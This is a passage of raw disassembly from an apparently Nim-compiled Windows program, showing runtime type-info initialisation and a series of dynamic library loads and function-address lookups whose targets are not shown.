  4099f9:	48 c7 05 44 0b 02 00 	movq   $0x30,0x20b44(%rip)        # 42a548 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1e8>
  409a00:	30 00 00 00 
  409a04:	48 c7 05 01 0a 02 00 	movq   $0x4,0x20a01(%rip)        # 42a410 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0xb0>
  409a0b:	04 00 00 00 
  409a0f:	c6 05 da 09 02 00 02 	movb   $0x2,0x209da(%rip)        # 42a3f0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x90>
  409a16:	48 c7 05 bf 06 02 00 	movq   $0x38,0x206bf(%rip)        # 42a0e0 <NTI__te3W2Tqi7xuJ7rlPtg9al5w_>
  409a1d:	38 00 00 00 
  409a21:	c6 05 c0 06 02 00 11 	movb   $0x11,0x206c0(%rip)        # 42a0e8 <NTI__te3W2Tqi7xuJ7rlPtg9al5w_+0x8>
  409a28:	48 c7 05 5d 0b 02 00 	movq   $0x0,0x20b5d(%rip)        # 42a590 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x230>
  409a2f:	00 00 00 00 
  409a33:	c6 05 36 0b 02 00 02 	movb   $0x2,0x20b36(%rip)        # 42a570 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x210>
  409a3a:	48 c7 05 3b 0f 02 00 	movq   $0x8,0x20f3b(%rip)        # 42a980 <NTI__TjokxNjmnZmr9bygVDVC9bvg_>
  409a41:	08 00 00 00 
  409a45:	c6 05 3c 0f 02 00 16 	movb   $0x16,0x20f3c(%rip)        # 42a988 <NTI__TjokxNjmnZmr9bygVDVC9bvg_+0x8>
  409a4c:	48 c7 05 79 0f 02 00 	movq   $0x0,0x20f79(%rip)        # 42a9d0 <NTI__FEvFMlkqJiSSGVO6HgTv8w_+0x10>
  409a53:	00 00 00 00 
  409a57:	48 c7 05 5e 0f 02 00 	movq   $0x8,0x20f5e(%rip)        # 42a9c0 <NTI__FEvFMlkqJiSSGVO6HgTv8w_>
  409a5e:	08 00 00 00 
  409a62:	66 c7 05 5d 0f 02 00 	movw   $0x312,0x20f5d(%rip)        # 42a9c8 <NTI__FEvFMlkqJiSSGVO6HgTv8w_+0x8>
  409a69:	12 03 
  409a6b:	c6 05 8e 0b 02 00 01 	movb   $0x1,0x20b8e(%rip)        # 42a600 <TM__IP4V1hRabVpf8OnX9bWuPxw_0.2132>
  409a72:	48 c7 05 8b 0b 02 00 	movq   $0x0,0x20b8b(%rip)        # 42a608 <TM__IP4V1hRabVpf8OnX9bWuPxw_0.2132+0x8>
  409a79:	00 00 00 00 
  409a7d:	48 89 3d 8c 0b 02 00 	mov    %rdi,0x20b8c(%rip)        # 42a610 <TM__IP4V1hRabVpf8OnX9bWuPxw_0.2132+0x10>
  409a84:	48 8d 3d c3 29 00 00 	lea    0x29c3(%rip),%rdi        # 40c44e <.rdata+0x44e>
  409a8b:	48 89 3d 86 0b 02 00 	mov    %rdi,0x20b86(%rip)        # 42a618 <TM__IP4V1hRabVpf8OnX9bWuPxw_0.2132+0x18>
  409a92:	48 8d 3d 67 0b 02 00 	lea    0x20b67(%rip),%rdi        # 42a600 <TM__IP4V1hRabVpf8OnX9bWuPxw_0.2132>
  409a99:	48 89 3d 38 0f 02 00 	mov    %rdi,0x20f38(%rip)        # 42a9d8 <NTI__FEvFMlkqJiSSGVO6HgTv8w_+0x18>
  409aa0:	48 8d 3d 69 0c 02 00 	lea    0x20c69(%rip),%rdi        # 42a710 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x30>
  409aa7:	48 89 3d 52 0d 02 00 	mov    %rdi,0x20d52(%rip)        # 42a800 <TM__0JXiWyhP5OCO8jWMA6sb1w_2_2.2156>
  409aae:	48 83 c7 60          	add    $0x60,%rdi
  409ab2:	48 89 3d c7 0b 02 00 	mov    %rdi,0x20bc7(%rip)        # 42a680 <TM__0JXiWyhP5OCO8jWMA6sb1w_3_2.2157>
  409ab9:	48 83 c7 30          	add    $0x30,%rdi
  409abd:	48 89 3d c4 0b 02 00 	mov    %rdi,0x20bc4(%rip)        # 42a688 <TM__0JXiWyhP5OCO8jWMA6sb1w_3_2.2157+0x8>
  409ac4:	48 8d 3d b5 0b 02 00 	lea    0x20bb5(%rip),%rdi        # 42a680 <TM__0JXiWyhP5OCO8jWMA6sb1w_3_2.2157>
  409acb:	48 89 3d 96 0c 02 00 	mov    %rdi,0x20c96(%rip)        # 42a768 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x88>
  409ad2:	48 8d 3d 67 0c 02 00 	lea    0x20c67(%rip),%rdi        # 42a740 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x60>
  409ad9:	48 89 3d d8 0b 02 00 	mov    %rdi,0x20bd8(%rip)        # 42a6b8 <NTI__1v9bKyksXWMsm0vNwmZ4EuQ_+0x18>
  409ae0:	48 8d 3d b9 0b 02 00 	lea    0x20bb9(%rip),%rdi        # 42a6a0 <NTI__1v9bKyksXWMsm0vNwmZ4EuQ_>
  409ae7:	48 89 3d 62 0b 02 00 	mov    %rdi,0x20b62(%rip)        # 42a650 <NTI__8Np6tlClE5az1CyqZdN19bQ_+0x10>
  409aee:	48 8d 3d e0 7a ff ff 	lea    -0x8520(%rip),%rdi        # 4015d5 <Marker_tySequence__8Np6tlClE5az1CyqZdN19bQ>
  409af5:	48 89 05 2c 0c 02 00 	mov    %rax,0x20c2c(%rip)        # 42a728 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x48>
  409afc:	48 8d 05 cd 0c 02 00 	lea    0x20ccd(%rip),%rax        # 42a7d0 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xf0>
  409b03:	48 89 3d 5e 0b 02 00 	mov    %rdi,0x20b5e(%rip)        # 42a668 <NTI__8Np6tlClE5az1CyqZdN19bQ_+0x28>
  409b0a:	48 8d 3d 2f 0b 02 00 	lea    0x20b2f(%rip),%rdi        # 42a640 <NTI__8Np6tlClE5az1CyqZdN19bQ_>
  409b11:	48 89 05 f0 0c 02 00 	mov    %rax,0x20cf0(%rip)        # 42a808 <TM__0JXiWyhP5OCO8jWMA6sb1w_2_2.2156+0x8>
  409b18:	48 8d 05 35 29 00 00 	lea    0x2935(%rip),%rax        # 40c454 <.rdata+0x454>
  409b1f:	48 c7 05 06 0d 02 00 	movq   $0x0,0x20d06(%rip)        # 42a830 <NTI__bGAilYs5sUICRbD13gZaFg_+0x10>
  409b26:	00 00 00 00 
  409b2a:	48 c7 05 eb 0c 02 00 	movq   $0x10,0x20ceb(%rip)        # 42a820 <NTI__bGAilYs5sUICRbD13gZaFg_>
  409b31:	10 00 00 00 
  409b35:	66 c7 05 ea 0c 02 00 	movw   $0x212,0x20cea(%rip)        # 42a828 <NTI__bGAilYs5sUICRbD13gZaFg_+0x8>
  409b3c:	12 02 
  409b3e:	48 c7 05 67 0b 02 00 	movq   $0x0,0x20b67(%rip)        # 42a6b0 <NTI__1v9bKyksXWMsm0vNwmZ4EuQ_+0x10>
  409b45:	00 00 00 00 
  409b49:	48 c7 05 4c 0b 02 00 	movq   $0x10,0x20b4c(%rip)        # 42a6a0 <NTI__1v9bKyksXWMsm0vNwmZ4EuQ_>
  409b50:	10 00 00 00 
  409b54:	66 c7 05 4b 0b 02 00 	movw   $0x312,0x20b4b(%rip)        # 42a6a8 <NTI__1v9bKyksXWMsm0vNwmZ4EuQ_+0x8>
  409b5b:	12 03 
  409b5d:	c6 05 0c 0c 02 00 01 	movb   $0x1,0x20c0c(%rip)        # 42a770 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x90>
  409b64:	48 c7 05 09 0c 02 00 	movq   $0x0,0x20c09(%rip)        # 42a778 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x98>
  409b6b:	00 00 00 00 
  409b6f:	4c 89 3d 0a 0c 02 00 	mov    %r15,0x20c0a(%rip)        # 42a780 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xa0>
  409b76:	48 89 35 0b 0c 02 00 	mov    %rsi,0x20c0b(%rip)        # 42a788 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xa8>
  409b7d:	c6 05 1c 0c 02 00 01 	movb   $0x1,0x20c1c(%rip)        # 42a7a0 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xc0>
  409b84:	48 c7 05 19 0c 02 00 	movq   $0x8,0x20c19(%rip)        # 42a7a8 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xc8>
  409b8b:	08 00 00 00 
  409b8f:	4c 89 3d 1a 0c 02 00 	mov    %r15,0x20c1a(%rip)        # 42a7b0 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xd0>
  409b96:	48 89 1d 1b 0c 02 00 	mov    %rbx,0x20c1b(%rip)        # 42a7b8 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xd8>
  409b9d:	48 c7 05 b8 0b 02 00 	movq   $0x2,0x20bb8(%rip)        # 42a760 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x80>
  409ba4:	02 00 00 00 
  409ba8:	c6 05 91 0b 02 00 02 	movb   $0x2,0x20b91(%rip)        # 42a740 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x60>
  409baf:	48 c7 05 86 0a 02 00 	movq   $0x8,0x20a86(%rip)        # 42a640 <NTI__8Np6tlClE5az1CyqZdN19bQ_>
  409bb6:	08 00 00 00 
  409bba:	66 c7 05 85 0a 02 00 	movw   $0x218,0x20a85(%rip)        # 42a648 <NTI__8Np6tlClE5az1CyqZdN19bQ_+0x8>
  409bc1:	18 02 
  409bc3:	c6 05 46 0b 02 00 01 	movb   $0x1,0x20b46(%rip)        # 42a710 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x30>
  409bca:	48 c7 05 43 0b 02 00 	movq   $0x0,0x20b43(%rip)        # 42a718 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x38>
  409bd1:	00 00 00 00 
  409bd5:	48 89 3d 44 0b 02 00 	mov    %rdi,0x20b44(%rip)        # 42a720 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x40>
  409bdc:	c6 05 ed 0b 02 00 01 	movb   $0x1,0x20bed(%rip)        # 42a7d0 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xf0>
  409be3:	48 89 05 fe 0b 02 00 	mov    %rax,0x20bfe(%rip)        # 42a7e8 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x108>
  409bea:	48 8d 05 0f 0c 02 00 	lea    0x20c0f(%rip),%rax        # 42a800 <TM__0JXiWyhP5OCO8jWMA6sb1w_2_2.2156>
  409bf1:	48 89 05 10 0b 02 00 	mov    %rax,0x20b10(%rip)        # 42a708 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x28>
  409bf8:	48 8d 05 e1 0a 02 00 	lea    0x20ae1(%rip),%rax        # 42a6e0 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158>
  409bff:	48 89 05 32 0c 02 00 	mov    %rax,0x20c32(%rip)        # 42a838 <NTI__bGAilYs5sUICRbD13gZaFg_+0x18>
  409c06:	48 8d 05 83 0e 02 00 	lea    0x20e83(%rip),%rax        # 42aa90 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x30>
  409c0d:	48 89 05 fc 0f 02 00 	mov    %rax,0x20ffc(%rip)        # 42ac10 <TM__gfe9a52b5gJr8GSrnr883iA_2_2.53462>
  409c14:	48 83 c0 60          	add    $0x60,%rax
  409c18:	48 89 05 e1 0d 02 00 	mov    %rax,0x20de1(%rip)        # 42aa00 <TM__gfe9a52b5gJr8GSrnr883iA_3_2.53463>
  409c1f:	48 8d 05 9a 0d 02 00 	lea    0x20d9a(%rip),%rax        # 42a9c0 <NTI__FEvFMlkqJiSSGVO6HgTv8w_>
  409c26:	48 89 05 d3 0e 02 00 	mov    %rax,0x20ed3(%rip)        # 42ab00 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xa0>
  409c2d:	48 8d 05 ec 0e 02 00 	lea    0x20eec(%rip),%rax        # 42ab20 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xc0>
  409c34:	48 89 05 cd 0d 02 00 	mov    %rax,0x20dcd(%rip)        # 42aa08 <TM__gfe9a52b5gJr8GSrnr883iA_3_2.53463+0x8>
  409c3b:	48 8d 05 3e 0d 02 00 	lea    0x20d3e(%rip),%rax        # 42a980 <NTI__TjokxNjmnZmr9bygVDVC9bvg_>
  409c42:	48 89 05 e7 0e 02 00 	mov    %rax,0x20ee7(%rip)        # 42ab30 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xd0>
  409c49:	48 8d 05 b0 0d 02 00 	lea    0x20db0(%rip),%rax        # 42aa00 <TM__gfe9a52b5gJr8GSrnr883iA_3_2.53463>
  409c50:	48 89 05 91 0e 02 00 	mov    %rax,0x20e91(%rip)        # 42aae8 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x88>
  409c57:	48 8d 05 62 0e 02 00 	lea    0x20e62(%rip),%rax        # 42aac0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x60>
  409c5e:	48 89 05 d3 0d 02 00 	mov    %rax,0x20dd3(%rip)        # 42aa38 <NTI__5aoVPIWYzahUyBc9bMm0M5w_+0x18>
  409c65:	48 8d 05 d4 0c 02 00 	lea    0x20cd4(%rip),%rax        # 42a940 <NTI__mgfFdry9aKsRMW9au5u9bSpOQ_>
  409c6c:	48 89 05 2d 0e 02 00 	mov    %rax,0x20e2d(%rip)        # 42aaa0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x40>
  409c73:	48 8d 05 e2 27 00 00 	lea    0x27e2(%rip),%rax        # 40c45c <.rdata+0x45c>
  409c7a:	48 89 05 27 0e 02 00 	mov    %rax,0x20e27(%rip)        # 42aaa8 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x48>
  409c81:	48 8d 05 c8 0e 02 00 	lea    0x20ec8(%rip),%rax        # 42ab50 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xf0>
  409c88:	48 c7 05 45 0b 02 00 	movq   $0x8,0x20b45(%rip)        # 42a7d8 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0xf8>
  409c8f:	08 00 00 00 
  409c93:	4c 89 3d 46 0b 02 00 	mov    %r15,0x20b46(%rip)        # 42a7e0 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x100>
  409c9a:	48 c7 05 5b 0a 02 00 	movq   $0x2,0x20a5b(%rip)        # 42a700 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158+0x20>
  409ca1:	02 00 00 00 
  409ca5:	c6 05 34 0a 02 00 02 	movb   $0x2,0x20a34(%rip)        # 42a6e0 <TM__0JXiWyhP5OCO8jWMA6sb1w_0.2158>
  409cac:	48 c7 05 a9 0f 02 00 	movq   $0x38,0x20fa9(%rip)        # 42ac60 <NTI__YNzlM8oq8NLlO720L2VFMw_>
  409cb3:	38 00 00 00 
  409cb7:	c6 05 aa 0f 02 00 11 	movb   $0x11,0x20faa(%rip)        # 42ac68 <NTI__YNzlM8oq8NLlO720L2VFMw_+0x8>
  409cbe:	48 89 2d ab 0f 02 00 	mov    %rbp,0x20fab(%rip)        # 42ac70 <NTI__YNzlM8oq8NLlO720L2VFMw_+0x10>
  409cc5:	48 c7 05 50 0d 02 00 	movq   $0x10,0x20d50(%rip)        # 42aa20 <NTI__5aoVPIWYzahUyBc9bMm0M5w_>
  409ccc:	10 00 00 00 
  409cd0:	c6 05 51 0d 02 00 12 	movb   $0x12,0x20d51(%rip)        # 42aa28 <NTI__5aoVPIWYzahUyBc9bMm0M5w_+0x8>
  409cd7:	48 c7 05 4e 0d 02 00 	movq   $0x0,0x20d4e(%rip)        # 42aa30 <NTI__5aoVPIWYzahUyBc9bMm0M5w_+0x10>
  409cde:	00 00 00 00 
  409ce2:	c6 05 07 0e 02 00 01 	movb   $0x1,0x20e07(%rip)        # 42aaf0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x90>
  409ce9:	48 c7 05 04 0e 02 00 	movq   $0x0,0x20e04(%rip)        # 42aaf8 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x98>
  409cf0:	00 00 00 00 
  409cf4:	48 89 35 0d 0e 02 00 	mov    %rsi,0x20e0d(%rip)        # 42ab08 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xa8>
  409cfb:	c6 05 1e 0e 02 00 01 	movb   $0x1,0x20e1e(%rip)        # 42ab20 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xc0>
  409d02:	48 c7 05 1b 0e 02 00 	movq   $0x8,0x20e1b(%rip)        # 42ab28 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xc8>
  409d09:	08 00 00 00 
  409d0d:	48 89 1d 24 0e 02 00 	mov    %rbx,0x20e24(%rip)        # 42ab38 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xd8>
  409d14:	48 c7 05 c1 0d 02 00 	movq   $0x2,0x20dc1(%rip)        # 42aae0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x80>
  409d1b:	02 00 00 00 
  409d1f:	c6 05 9a 0d 02 00 02 	movb   $0x2,0x20d9a(%rip)        # 42aac0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x60>
  409d26:	c6 05 63 0d 02 00 01 	movb   $0x1,0x20d63(%rip)        # 42aa90 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x30>
  409d2d:	48 c7 05 60 0d 02 00 	movq   $0x8,0x20d60(%rip)        # 42aa98 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x38>
  409d34:	08 00 00 00 
  409d38:	48 89 05 d9 0e 02 00 	mov    %rax,0x20ed9(%rip)        # 42ac18 <TM__gfe9a52b5gJr8GSrnr883iA_2_2.53462+0x8>
  409d3f:	48 8d 05 ba 0b 02 00 	lea    0x20bba(%rip),%rax        # 42a900 <NTI__oL07LSXp3QMM0uEpFQiyQg_>
  409d46:	48 89 05 13 0e 02 00 	mov    %rax,0x20e13(%rip)        # 42ab60 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x100>
  409d4d:	48 8d 05 bc 0e 02 00 	lea    0x20ebc(%rip),%rax        # 42ac10 <TM__gfe9a52b5gJr8GSrnr883iA_2_2.53462>
  409d54:	48 89 05 2d 0d 02 00 	mov    %rax,0x20d2d(%rip)        # 42aa88 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x28>
  409d5b:	48 8d 05 fe 0c 02 00 	lea    0x20cfe(%rip),%rax        # 42aa60 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465>
  409d62:	48 89 05 0f 0f 02 00 	mov    %rax,0x20f0f(%rip)        # 42ac78 <NTI__YNzlM8oq8NLlO720L2VFMw_+0x18>
  409d69:	48 8d 05 f0 0e 02 00 	lea    0x20ef0(%rip),%rax        # 42ac60 <NTI__YNzlM8oq8NLlO720L2VFMw_>
  409d70:	48 89 05 59 0b 02 00 	mov    %rax,0x20b59(%rip)        # 42a8d0 <NTI__mNiwh37MfaAP9cG4kqT6kpg_+0x10>
  409d77:	48 8d 05 32 0e 02 00 	lea    0x20e32(%rip),%rax        # 42abb0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x150>
  409d7e:	48 89 05 1b 0b 02 00 	mov    %rax,0x20b1b(%rip)        # 42a8a0 <TM__gfe9a52b5gJr8GSrnr883iA_4_2.53464>
  409d85:	48 8d 05 d7 26 00 00 	lea    0x26d7(%rip),%rax        # 40c463 <.rdata+0x463>
  409d8c:	48 89 05 35 0e 02 00 	mov    %rax,0x20e35(%rip)        # 42abc8 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x168>
  409d93:	48 8d 05 46 0e 02 00 	lea    0x20e46(%rip),%rax        # 42abe0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x180>
  409d9a:	48 89 05 07 0b 02 00 	mov    %rax,0x20b07(%rip)        # 42a8a8 <TM__gfe9a52b5gJr8GSrnr883iA_4_2.53464+0x8>
  409da1:	48 8d 05 78 0a 02 00 	lea    0x20a78(%rip),%rax        # 42a820 <NTI__bGAilYs5sUICRbD13gZaFg_>
  409da8:	48 89 05 41 0e 02 00 	mov    %rax,0x20e41(%rip)        # 42abf0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x190>
  409daf:	48 8d 05 b4 26 00 00 	lea    0x26b4(%rip),%rax        # 40c46a <.rdata+0x46a>
  409db6:	48 89 05 3b 0e 02 00 	mov    %rax,0x20e3b(%rip)        # 42abf8 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x198>
  409dbd:	48 8d 05 dc 0a 02 00 	lea    0x20adc(%rip),%rax        # 42a8a0 <TM__gfe9a52b5gJr8GSrnr883iA_4_2.53464>
  409dc4:	48 89 05 dd 0d 02 00 	mov    %rax,0x20ddd(%rip)        # 42aba8 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x148>
  409dcb:	48 8d 05 ae 0d 02 00 	lea    0x20dae(%rip),%rax        # 42ab80 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x120>
  409dd2:	c6 05 77 0d 02 00 01 	movb   $0x1,0x20d77(%rip)        # 42ab50 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xf0>
  409dd9:	48 c7 05 74 0d 02 00 	movq   $0x10,0x20d74(%rip)        # 42ab58 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0xf8>
  409de0:	10 00 00 00 
  409de4:	48 89 15 7d 0d 02 00 	mov    %rdx,0x20d7d(%rip)        # 42ab68 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x108>
  409deb:	48 c7 05 8a 0c 02 00 	movq   $0x2,0x20c8a(%rip)        # 42aa80 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x20>
  409df2:	02 00 00 00 
  409df6:	c6 05 63 0c 02 00 02 	movb   $0x2,0x20c63(%rip)        # 42aa60 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465>
  409dfd:	48 c7 05 b8 0a 02 00 	movq   $0x50,0x20ab8(%rip)        # 42a8c0 <NTI__mNiwh37MfaAP9cG4kqT6kpg_>
  409e04:	50 00 00 00 
  409e08:	c6 05 b9 0a 02 00 11 	movb   $0x11,0x20ab9(%rip)        # 42a8c8 <NTI__mNiwh37MfaAP9cG4kqT6kpg_+0x8>
  409e0f:	c6 05 9a 0d 02 00 01 	movb   $0x1,0x20d9a(%rip)        # 42abb0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x150>
  409e16:	48 c7 05 97 0d 02 00 	movq   $0x38,0x20d97(%rip)        # 42abb8 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x158>
  409e1d:	38 00 00 00 
  409e21:	4c 89 3d 98 0d 02 00 	mov    %r15,0x20d98(%rip)        # 42abc0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x160>
  409e28:	c6 05 b1 0d 02 00 01 	movb   $0x1,0x20db1(%rip)        # 42abe0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x180>
  409e2f:	48 c7 05 ae 0d 02 00 	movq   $0x40,0x20dae(%rip)        # 42abe8 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x188>
  409e36:	40 00 00 00 
  409e3a:	48 c7 05 5b 0d 02 00 	movq   $0x2,0x20d5b(%rip)        # 42aba0 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x140>
  409e41:	02 00 00 00 
  409e45:	c6 05 34 0d 02 00 02 	movb   $0x2,0x20d34(%rip)        # 42ab80 <TM__gfe9a52b5gJr8GSrnr883iA_0.53465+0x120>
  409e4c:	48 89 05 85 0a 02 00 	mov    %rax,0x20a85(%rip)        # 42a8d8 <NTI__mNiwh37MfaAP9cG4kqT6kpg_+0x18>
  409e53:	e8 53 7b ff ff       	call   4019ab <nimLoadLibrary>
  409e58:	48 8d 0d 01 79 00 00 	lea    0x7901(%rip),%rcx        # 411760 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_5>
  409e5f:	48 85 c0             	test   %rax,%rax
  409e62:	48 89 05 6f 0e 02 00 	mov    %rax,0x20e6f(%rip)        # 42acd8 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_2>
  409e69:	0f 84 c9 f2 ff ff    	je     409138 <main+0xb08>
  409e6f:	48 8d 15 fc 25 00 00 	lea    0x25fc(%rip),%rdx        # 40c472 <.rdata+0x472>
  409e76:	48 89 c1             	mov    %rax,%rcx
  409e79:	e8 f1 7f ff ff       	call   401e6f <nimGetProcAddr>
  409e7e:	48 8b 0d 53 0e 02 00 	mov    0x20e53(%rip),%rcx        # 42acd8 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_2>
  409e85:	48 8d 15 f9 25 00 00 	lea    0x25f9(%rip),%rdx        # 40c485 <.rdata+0x485>
  409e8c:	48 89 05 3d 0e 02 00 	mov    %rax,0x20e3d(%rip)        # 42acd0 <Dl_25975001_>
  409e93:	e8 d7 7f ff ff       	call   401e6f <nimGetProcAddr>
  409e98:	48 8b 0d 39 0e 02 00 	mov    0x20e39(%rip),%rcx        # 42acd8 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_2>
  409e9f:	48 8d 15 f6 25 00 00 	lea    0x25f6(%rip),%rdx        # 40c49c <.rdata+0x49c>
  409ea6:	48 89 05 1b 0e 02 00 	mov    %rax,0x20e1b(%rip)        # 42acc8 <Dl_25965001_>
  409ead:	e8 bd 7f ff ff       	call   401e6f <nimGetProcAddr>
  409eb2:	48 8b 0d 1f 0e 02 00 	mov    0x20e1f(%rip),%rcx        # 42acd8 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_2>
  409eb9:	48 8d 15 e9 25 00 00 	lea    0x25e9(%rip),%rdx        # 40c4a9 <.rdata+0x4a9>
  409ec0:	48 89 05 f9 0d 02 00 	mov    %rax,0x20df9(%rip)        # 42acc0 <Dl_26815001_>
  409ec7:	e8 a3 7f ff ff       	call   401e6f <nimGetProcAddr>
  409ecc:	48 8b 0d 05 0e 02 00 	mov    0x20e05(%rip),%rcx        # 42acd8 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_2>
  409ed3:	48 8d 15 d6 25 00 00 	lea    0x25d6(%rip),%rdx        # 40c4b0 <.rdata+0x4b0>
  409eda:	48 89 05 d7 0d 02 00 	mov    %rax,0x20dd7(%rip)        # 42acb8 <Dl_25910001_>
  409ee1:	e8 89 7f ff ff       	call   401e6f <nimGetProcAddr>
  409ee6:	48 8b 0d eb 0d 02 00 	mov    0x20deb(%rip),%rcx        # 42acd8 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_2>
  409eed:	48 8d 15 cd 25 00 00 	lea    0x25cd(%rip),%rdx        # 40c4c1 <.rdata+0x4c1>
  409ef4:	48 89 05 b5 0d 02 00 	mov    %rax,0x20db5(%rip)        # 42acb0 <Dl_27160001_>
  409efb:	e8 6f 7f ff ff       	call   401e6f <nimGetProcAddr>
  409f00:	48 8b 0d d1 0d 02 00 	mov    0x20dd1(%rip),%rcx        # 42acd8 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_2>
  409f07:	48 8d 15 bd 25 00 00 	lea    0x25bd(%rip),%rdx        # 40c4cb <.rdata+0x4cb>
  409f0e:	48 89 05 93 0d 02 00 	mov    %rax,0x20d93(%rip)        # 42aca8 <Dl_26365001_>
  409f15:	e8 55 7f ff ff       	call   401e6f <nimGetProcAddr>
  409f1a:	48 8b 0d b7 0d 02 00 	mov    0x20db7(%rip),%rcx        # 42acd8 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_2>
  409f21:	48 8d 15 ac 25 00 00 	lea    0x25ac(%rip),%rdx        # 40c4d4 <.rdata+0x4d4>
  409f28:	48 89 05 71 0d 02 00 	mov    %rax,0x20d71(%rip)        # 42aca0 <Dl_26115001_>
  409f2f:	e8 3b 7f ff ff       	call   401e6f <nimGetProcAddr>
  409f34:	48 8d 0d 85 78 00 00 	lea    0x7885(%rip),%rcx        # 4117c0 <TM__kNniPh4YJmm9aWyhkCQWDNg_4>
  409f3b:	48 89 05 56 0d 02 00 	mov    %rax,0x20d56(%rip)        # 42ac98 <Dl_26125001_>
  409f42:	e8 64 7a ff ff       	call   4019ab <nimLoadLibrary>
  409f47:	48 8d 0d 52 78 00 00 	lea    0x7852(%rip),%rcx        # 4117a0 <TM__kNniPh4YJmm9aWyhkCQWDNg_5>
  409f4e:	48 85 c0             	test   %rax,%rax
  409f51:	48 89 05 b8 0d 02 00 	mov    %rax,0x20db8(%rip)        # 42ad10 <TM__kNniPh4YJmm9aWyhkCQWDNg_2>
  409f58:	0f 84 da f1 ff ff    	je     409138 <main+0xb08>
  409f5e:	48 8d 15 7c 25 00 00 	lea    0x257c(%rip),%rdx        # 40c4e1 <.rdata+0x4e1>
  409f65:	48 89 c1             	mov    %rax,%rcx
  409f68:	e8 02 7f ff ff       	call   401e6f <nimGetProcAddr>
  409f6d:	48 8b 0d 9c 0d 02 00 	mov    0x20d9c(%rip),%rcx        # 42ad10 <TM__kNniPh4YJmm9aWyhkCQWDNg_2>
  409f74:	48 8d 15 77 25 00 00 	lea    0x2577(%rip),%rdx        # 40c4f2 <.rdata+0x4f2>
  409f7b:	48 89 05 86 0d 02 00 	mov    %rax,0x20d86(%rip)        # 42ad08 <Dl_29815001_>
  409f82:	e8 e8 7e ff ff       	call   401e6f <nimGetProcAddr>
